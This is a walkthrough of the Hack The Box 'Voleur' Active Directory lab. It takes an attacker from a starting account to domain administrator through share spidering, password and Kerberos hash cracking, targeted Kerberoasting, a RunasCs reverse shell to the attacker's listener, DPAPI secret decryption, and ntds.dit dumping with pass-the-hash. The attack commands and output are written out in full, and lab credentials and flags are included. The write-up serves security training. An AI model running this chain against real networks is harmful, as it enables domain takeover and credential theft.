# Machine Information
As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt

# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌─[eu-release-1]─[10.10.14.111]─[hackthekat123@htb-ezd0v30crp]─[~]
└──╼ [★]$ nmap -p- 10.129.242.52 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-06 06:18 CDT
Stats: 0:01:39 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 68.73% done; ETC: 06:20 (0:00:45 remaining)
Nmap scan report for 10.129.242.52
Host is up (0.0079s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2222/tcp  open  EtherNetIP-1
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
60311/tcp open  unknown
60317/tcp open  unknown
60336/tcp open  unknown
```
### Detailed port scan

At the detailed port scan go to get more information from the services which are open on the ip address.

```
nmap -p53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389 -sCV 10.129.242.52 -Pn -vvvv
///
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-06 19:22:36Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
2222/tcp open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
| ssh-rsa 
...
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
| ecdsa-sha2-nistp256 
...
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        syn-ack ttl 127 .NET Message Framing
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
```

## The basics - rpc enumeration

We can see that the connection to the SMB server, LDAP server are open. So, As usual I like to start with running `enum4linux` because this tool automates a lot of basic enumerations for most of the AD protocols, but as you can see does the server not allow any session by using the user credentials.

```
┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ enum4linux -u 'ryan.naylor' -p 'HollowOct31Nyt' voleur.htb                               
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jul  6 22:31:39 2025

 =========================================( Target Information )=========================================

Target ........... voleur.htb
RID Range ........ 500-550,1000-1050
Username ......... 'ryan.naylor'
Password ......... 'HollowOct31Nyt'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 =============================( Enumerating Workgroup/Domain on voleur.htb )=============================

[E] Can't find workgroup/domain

 ====================================( Session Check on voleur.htb )====================================

[E] Server doesn't allow session using username 'ryan.naylor', password 'HollowOct31Nyt'.  Aborting remainder of tests.
```

Because I know the smb port is open I went to see what shared drives the user ryan.naylor can handle. This I went by using the netexec tool.

```
┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ netexec smb dc.voleur.htb -u ryan.naylor -p HollowOct31Nyt --shares -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                                  
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share 
```

Now that we have seen that the user ryan.naylor has permissions to read the IT shared drive, I will see if we can't connect to it using the smbclient command. But as you will see below it will not be supported.

```
┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ smbclient //dc.voleur.htb/IT -U 'ryan.naylor'                                                      
session setup failed: NT_STATUS_NOT_SUPPORTED
```

So I will have to find another way to find out what is in the IT shared drive. If we go and look at the netexec command we didn't get any error so the solution will be in there. If you are working with the help command you can get to the following command for reading the IT shared drive and looking for files within it.

```
┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ netexec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --spider IT --content --regex Encrypt 
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Started spidering
SMB         dc.voleur.htb   445    dc               [*] Spidering .
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/First-Line Support/Access_Review.xlsx [lastm:'2025-05-30 00:23' size:16896 offset:4096 regex:'b'Encrypt'']
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/First-Line Support/Access_Review.xlsx [lastm:'2025-05-30 00:23' size:16896 offset:16384 regex:'b'Encrypt'']
SMB         dc.voleur.htb   445    dc               //dc.voleur.htb/IT/First-Line Support/Access_Review.xlsx [lastm:'2025-05-30 00:23' size:16896 offset:16896 regex:'b'Encrypt'']
SMB         dc.voleur.htb   445    dc               [*] Done spidering (Completed in 0.573829174041748)
```

By going with the help command again, by using the get-file parameter and then pointing to the shared drive you will be able to download the file to your own machine.

```
┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ netexec smb DC.voleur.htb -u 'ryan.naylor' -p HollowOct31Nyt --shares -k --get-file 'First-Line Support/Access_Review.xlsx' './Access_Review.xlsx' --share IT
SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                                  
SMB         DC.voleur.htb   445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         DC.voleur.htb   445    DC               [*] Enumerated shares
SMB         DC.voleur.htb   445    DC               Share           Permissions     Remark
SMB         DC.voleur.htb   445    DC               -----           -----------     ------
SMB         DC.voleur.htb   445    DC               ADMIN$                          Remote Admin
SMB         DC.voleur.htb   445    DC               C$                              Default share
SMB         DC.voleur.htb   445    DC               Finance                         
SMB         DC.voleur.htb   445    DC               HR                              
SMB         DC.voleur.htb   445    DC               IPC$            READ            Remote IPC
SMB         DC.voleur.htb   445    DC               IT              READ            
SMB         DC.voleur.htb   445    DC               NETLOGON        READ            Logon server share 
SMB         DC.voleur.htb   445    DC               SYSVOL          READ            Logon server share 
SMB         DC.voleur.htb   445    DC               [*] Copying "First-Line Support/Access_Review.xlsx" to "./Access_Review.xlsx"
SMB         DC.voleur.htb   445    DC               [+] File "First-Line Support/Access_Review.xlsx" was downloaded to "./Access_Review.xlsx"
```

Before we will be able to look into the file, you will first need to crack the hash using john. To get the password hash of the file you can use office2john like the command below.

```
┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ office2john Access_Review.xlsx 
Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c
```

We are now going to put the hash into a password file and then we will crack it.

```
┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ echo 'Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c' > hash
```

We are going to crack the File by using johntheripper and as you will see below the password to open the file is football1.

```
┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                     
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)     
1g 0:00:00:03 DONE (2025-07-07 00:18) 0.2873g/s 225.2p/s 225.2c/s 225.2C/s football1..lolita
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

I converted the file to an xml file because if you want to open the .xlsx file you will get the error that it is not the correct file extension. You can see this by using the binwalk command. There you will see that the description is an xml document and you will have to convert this file to an .xml file.

```
┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ binwalk Access_Review.xlsx

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
3656          0xE48           XML document, version: "1.0"

```

So if you then changed the file extension you can open the file using the libreoffice tool. A password prompt will then come up and you will have to enter the password you just cracked with john and then the file will be opened.

```
Change file extension

┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ mv Access_Review.xlsx Access_Review.xml

Open File with libreoffice
┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ libreoffice Access_Review.xml
```

Now that the file has been opened you will see the following.

![[Pasted image 20250707112153.png]]

As you can see above, we see different login credentials. I'll just put the credentials in a table below.

| Username   | Password           | Active or not Active |
| ---------- | ------------------ | -------------------- |
| Todd.Wolfe | NightT1meP1dg3on14 | Not Active           |
| svc_ldap   | M1XyC9pW7qT5Vn     | Active               |
| svc_iis    | N5pXyW1VqM7CZ8     | Active               |
So now if I go and look in bloodhound you can see that the user WriteSPN has permissions over the user SVC_WINRM, which means that we are going to do targetkerberoast attack to get his credentials and after which we can thus log in to the windows server.

![[Pasted image 20250707112137.png]]

If you will just run the kerberoast attack you will be able to see that you will get that it is invalid credentials.

```
┌──(kali㉿kali)-[~/HTB/Voleur/targetedKerberoast]
└─$ python targetedKerberoast.py -d 'voleur.htb' --dc-host dc.voleur.htb -u 'svc_ldap@voleur.htb' -p 'M1XyC9pW7qT5Vn'   
[*] Starting kerberoast attacks
[!] automatic bind not successful - invalidCredentials
```

So you will have to first create a TGT ticket, export it, and then go run the targetkerberoast attack so that it will use the correct credentials.

```
┌──(kali㉿kali)-[~/HTB/Voleur/targetedKerberoast]
└─$ impacket-getTGT -dc-ip 10.129.147.199 voleur.htb/svc_ldap:M1XyC9pW7qT5Vn -k
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_ldap.ccache

┌──(kali㉿kali)-[~/HTB/Voleur/targetedKerberoast]
└─$ export KRB5CCNAME=svc_ldap.ccache

┌──(kali㉿kali)-[~/HTB/Voleur/targetedKerberoast]
└─$ python targetedKerberoast.py -v -d 'voleur.htb' --dc-host dc.voleur.htb -u 'svc_ldap@voleur.htb' -p 'M1XyC9pW7qT5Vn' -k 
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (lacey.miller)
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$305c9ebfdeaa4f1ee9d1867db9b443de$988d82708a4f47d2648260c48881c4d3c6a74f5876d61faf7e2b2854ebf5eea4b10505d202ccf3bdcebdbd510827fc16b5a80a3294b1bb9b317f3f3743bbb77be94d8997e2be9b5e76f880b03a84e72b111e2871bac0cbf5162f33b4159e3127a990cf2c8887ca4f7239ee193cad76c86c8e287ccf2c81bbb12f003b7eaff15ef271c4de700edf3e00c30b0e64afa1221a7c1b66b2e3facb19b4d4ef7d4af74132d8879dfde2ca4b9305937b491aba4c0b30a644db879fc30d0713e9823d32ae2e3d59b0be771420c6aaea90cec37b320ee679ca11e661071c562dd9ce4e49f03dbf80c6138386d51a602ad0e38ee1b43683ebce6cd9e22ed724fd9f8fb724eea54bbac1e0bd8feb89c805a930452b9bccc47560092c4174451ec63d4389c2712b22ae9df966b61c12ceb6c835d52e889d9171cb155366cb7f1b15fd884e8a23b6e7f1e4eaff9840a5025675c3bbba2eaa531fdd16c0bb0be6100c9f73116131e80fdc33b3dc639557d3abf15fc0c0a33fbafa513d4e881d14c963aeef513fc18b8fc3c969b74a986fa6d678992dc8a1972e7c5f770f969b4e18b8dd16ee4a032ac01d5887748ea1e82a3a7c17b1484e704d883bd34e05ccf070938127612a46c4bc580eed53cde2a899daa06549adf6cf5357485a534c1cbcb62f4625805ff9a98e61709adf9cdafa8def7228128c76f7b9267e196d446f1dd2002fb6327d35ca18bc4b8cb4752cffcc8df895d040fdc35c600b1483b68a326b62a884b11fcd9a29b3fc5e03917366ebd8df3c3df691e91cf60d0a605d70596eeb7962844ef6852e9a4389b5a848a0ecec4c617de5e0754cf833343cb0f1aa692de30471d5fdd170643cb5e6374ec5dd93e2b6571831a1dd2bc85af950ed75be4a53b58fa5cb1c46533825453030561859340a0ac37dc97853068fcd576aeda61032cf14c1b6cc04e03d0e063324b47462b28ef3490afbec6e98bd18ba04be065bfe7b4b993ab000ff60ca03412580a5f0f9fff72abcbaaa40b2acc49cc623820edb586c90c992da31b11406a15c73ee438a71853f0b67bd0773eec07592231e5e08f30e4be1a3738340e527b746c9806be3eca3e66a0576f7e4f2041cfaf4eb80f19927a008f1c73af83c4d44fe63067319a92e79520c9cb4d4961c7d7f5387d54d3da3885ca3132df8b01f079f47c954e4d056a3213c8f350148ee4d317f586333c5a430aef094eb422acbd12ff95feebb1adb4560cc54e1e230fc92ce2f37fddae9da9193c9c44fae899853536d2a0b4970800c3ca8a7b57f4315a3a843b023bc6a5b611a6f08d3c3633d35940b001409848ff3aae12a497e04ff8c9cc575c04bc2fc8aee1c254e22470808ceea82fcd7f07b4dec6b436b99e243ced6520354206aa36c7f1052b0ccb4eabd14d2d96c9c39e44eb6bcb56a31547f0597410c162f9fbc2c25883fda363d049ae246b045307bf8c759ef88ad
[VERBOSE] SPN removed successfully for (lacey.miller)
[VERBOSE] SPN added successfully for (svc_winrm)
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$fee3e1792e42a301ff77614b9443b80e$b1c5d870aab460c1f303730051027b575f0acc5abf97caa3a4275f699f555a3f819fce4a46034024c6109c674c6aeee0492257b1998a0d63c0dfb4dd2a11092890a3c4bd85f15252cddf31e21e302ccc27c23b08133fc7e750d81e3a844ab7b617c723029397c92310c45b7ff25831c3d325250abc791175b7fda66e944c5339ab626e24ff8b7dfbee3e3f4f1fafddf3e4ef9308af2f62ae3efae76962afc92a3fdb46a36f7a7cf6f0c68eb1955e3012923e29e7151aa2e7acf4c5bcba6521e97491bf1c10ee5e51c0c493c0ab7a3f33905d399ddf556f4e4d448b8837d2dbe608bb021971c2168eb54821914472e5c3e6b677f1b3256753bdd72806f4295689e735f44155dd69701138397aa912f9ecb202a07193c06665e5c4eab5fa896bfdf916cbec2ccdb3ed722e911f164882d2af2e98a20ddcc1b41ef0ad36c49314a0106d4c084f7eb66a4b2f9cab03348f19a7c684f5738f380f9cfc844cdb28ac15a14f5430458fcd24ffccd9f93e852ae20be9aec71b9c901020c5a0acd841a4e8925ddcb9eca5cf4be5ad498b5ed85a1f86a71c50dd2a585acd46978b8558a03786425b6bf59614fdd1a9ac084d13563bfc19d1bdecc788f31b751ff56ed0ba3b39eb119b72183324ce58966ec87f783bd22c3568b8e7c0480e495c033c52880ecdcf50b27fbe0198a080ce536bc750955940acfce6f05a3b0eb496279ad618a69b09e23ee929c6125eac3e7dbfa0c4a79f80ec9b10adb672bb3e9d7d379c51efa60c6e6830be75571cd89c4e077b32e08d6ba3536aed8f25f837afc17e00b9d64455beee6d1577e9fdf2b35f21ed11cd3d31ca9c51d0177df8742cad6122476dcc9c665e0087529dcf42d9083572ac2233862b0667f3b3c9695775bf309e8279bb277ab605d483dd12df42befdcac5167cedc664258655b3fdb6d1ac6546c2eb7cccffeeffa950f75600239d95ab690d0cd47ddd623faf20dc3945708b33d43cdebc3305a61095bd578d26d3126e34545623f548e47de06f446f56a115a3b1af6184dea4e16b33b6327bb9b492c63ab9a8c3d0a9c4fc30f6982bbf936d7fcbf25bb341dd98d2b4c5db18637665510c222ddc587a79ea9781b682d0889a2ff030dcc818f933cedd1eedb8847b6dd54776dc4171a4e33fbdbede5b55437804c976143b1c660f5b39ffa7ac36ced9f305ef6aec22c5bc2734a068018d0e5f4e44180adf308fa0d2fcf86f03fe97ffe8d7a9342e21f58bf2bd07b5232b0718f05a7e538021eed3d6e414b7f9e7114682b17bf4dedb832cfeae336325f6bb6990038aa94eea78bf1d24507de9f83d28e2cc736583133dd8c21ab45b821d44ae8780e9f9f8a1ac8622fbabd3cf9d15cdfe4ef7c75ea8bcbe67aafa459cec19d9305561c86b7feae0862036209d2d1d3a82dba9b964d11ada76de5213ecae1ee032199ce9454450a5502b62d28a7cb7675fb09f570bbc
[VERBOSE] SPN removed successfully for (svc_winrm)
```

## Crack svc_winrm hash

I will go and put the hash in a file and have it cracked by using john.

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash2                    
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
AFireInsidedeOzarctica980219afi (?)     
1g 0:00:00:04 DONE (2025-07-07 01:07) 0.2475g/s 2839Kp/s 2839Kc/s 2839KC/s AHANACK6978012..AFITA4162
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

I went to try logging in with the the password we just cracked but I get the following error "Error: An error of type ArgumentError happened, message is unknown type: 2061232681". I started looking this up but nothing that helped me further with this problem. I then went as before to first create a TGS ticket, then specify which .ccache file we are going to use for authentication and then I went to connect to the windows server.

```
──(kali㉿kali)-[~]
└─$ impacket-getTGT -dc-ip 10.129.147.199 voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi -k
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache

┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=svc_winrm.ccache                                    

┌──(kali㉿kali)-[~]
└─$ evil-winrm -i dc.voleur.htb -u svc_winrm -r voleur.htb                         

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents>
```


As you can see now, I am logged in as the user svc_winrm and can start looking at the user.txt.

User flag: ea2cc31964bf10b056926fb1e651154e

```
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> ls


    Directory: C:\Users\svc_winrm\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   7:07 AM           2312 Microsoft Edge.lnk
-ar---          7/6/2025  12:16 PM             34 user.txt


*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> cat user.txt
ea2cc31964bf10b056926fb1e651154e
```

Since I cannot connect to the user svc_ldap via an evil-winrm connection, I will now try to do this by using the runas command. For a more detailed explanation on this more can be found in my RustyKey HTB Writeup.

```
On the Win connection as svc_winrm

*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> .\RunasCs_net2.exe svc_ldap M1XyC9pW7qT5Vn Powershell.exe -r 10.10.16.48:4444

Kali machine
┌──(kali㉿kali)-[~/HTB/Voleur/targetedKerberoast]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.48] from (UNKNOWN) [10.129.147.199] 56198

PS C:\Windows\system32>
```

Before that you could see that there was a user Todd.Wolfe known, but it was deleted from AD. I will be restoring this one now. https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-recycle-bin/

```
PS C:\Windows\system32> Get-ADObject -Filter 'SamAccountName -eq "todd.wolfe"' -IncludeDeletedObjects | Restore-ADObject
```

So now that I have this user restored I will first have to create a TGT ticket for Todd.Wolfe, export it then Login to the smb server using the impacket-smbclient tool.

```
┌──(kali㉿kali)-[~]
└─$ impacket-smbclient -k -no-pass voleur.htb/Todd.Wolfe@dc.voleur.htb     
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# ls
```

Now that I am logged in, the first thing I did was to see if there were any dpapi files to be found. I started looking for this by using the following article. https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets

Decrypt masterkey
Gebruiken van volgende path /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88. First, download this file to your own machine.

```
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

Decrypt the file by using the dpapi file from the following path. /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD585253490A9B0039791D3. So you will have to download this file to your own machine before you can use it. The Key you need to use is the just decrypted key from your previous command.

```
┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

I then went as before to first create a TGT ticket, then specify which .ccache file we are going to use for authentication and then I went to connect to the smb server.

```
┌──(kali㉿kali)-[~]
└─$ impacket-getTGT voleur.htb/jeremy.combs:'qT3V9pLXyN7W4m' -dc-ip 10.129.147.199
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in jeremy.combs.ccache

┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=jeremy.combs.ccache

Connect to smbserver

┌──(kali㉿kali)-[~]
└─$ impacket-smbclient -k -no-pass voleur.htb/jeremy.combs@dc.voleur.htb
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
#
```

Within IT/Third-Line Support you have 2 files. 1 ID_RSA file and 1 Note.txt.txt ffile in which it says:

```
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```

If we take a look at the .xml file from before, you will see that it said to speak to jeremy. What if the id_rsa file can be used to log in with an ssh connection on port 2222 by the user svc_backup.

```
┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ sudo ssh svc_backup@voleur.htb -i id_rsa -p 2222
///
svc_backup@DC:~$
```


Download the registery files to the kali machine. no SAM file is needed because we have ntds files. The NTDS.dit file is the lern of AD. It is literally _the_ database in which all identity and authentication information is stored. The SYSTEM file contains the information that Windows uses to manage the syskey (boot key). The SECURITY file contains the Security Account Manager (SAM) database portion of the registry that includes LAPS passwords and policy settings. So in other words, if you want to decrypt password hashes from NTDS.dit, you need at least the SYSTEM file to extract the boot key. The SECURITY file is especially useful if you want to examine local secrets and policies. So both files are important targets during a domain controller compromise

```
┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ ssh svc_backup@voleur.htb -i id_rsa -p 2222 'cat "/mnt/c/it/Third-Line Support/backups/registry/SECURITY"' > SECURITY

┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ ssh svc_backup@voleur.htb -i id_rsa -p 2222 'cat "/mnt/c/it/Third-Line Support/backups/registry/SYSTEM"' > SYSTEM

┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ ssh svc_backup@voleur.htb -i id_rsa -p 2222 'cat "/mnt/c/it/Third-Line Support/backups/Active Directory/ntds.dit"' > ntds.dit

┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ ssh svc_backup@voleur.htb -i id_rsa -p 2222 'cat "/mnt/c/it/Third-Line Support/backups/Active Directory/ntds.jfm"' > ntds.jfm

```

### Dumping password hashes

Now that I have downloaded all the file from the smb server to my own machine, you can use the secretsdump.py to dump all the password hashes from the ntds.dit file. You will see that the password hashes of the Administraror user are dumped.

```
┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit local
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
///
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
///
[*] Cleaning up...
```

Now that we have the NTLM hash of the Administrator we can repeat the same step as above but for the Administrator. As before, I first created a TGT ticket, then specified which .ccache file we will use for authentication and then connected to the Windows server to get the root flag.

```
┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ impacket-getTGT voleur.htb/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 -dc-ip 10.129.147.199

[*] Saving ticket in Administrator.ccache
                    
┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ export KRB5CCNAME=Administrator.ccache 

┌──(kali㉿kali)-[~/HTB/Voleur]
└─$ evil-winrm -i dc.voleur.htb -u svc_winrm -r voleur.htb

```

Root flag: ecd3eef46fa9b0be1c97d867136866d8

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
ecd3eef46fa9b0be1c97d867136866d8
```

![[Pasted image 20250707112051.png]]